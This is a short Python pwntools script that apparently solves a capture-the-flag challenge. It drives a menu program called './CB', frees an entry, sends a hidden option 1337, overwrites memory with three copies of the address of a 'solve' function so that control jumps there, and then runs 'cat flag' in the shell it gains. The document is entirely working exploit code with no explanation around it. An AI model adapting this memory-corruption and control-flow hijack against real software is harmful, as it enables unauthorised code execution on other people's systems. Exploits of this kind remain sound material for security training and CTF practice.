from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')

'''
gdb-peda$ p solve
$1 = {<text variable, no debug info>} 0x80485ab <solve>
'''

solve = 0x80485ab

def go(n, st='4. info\n'):
	s.recvuntil(st)
	s.sendline(str(n))

go(1)
go('test', 'name:')
go('1', 'age :')

go(3) # del
go(1337)
s.send(p32(solve)*3)
go(4)

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()

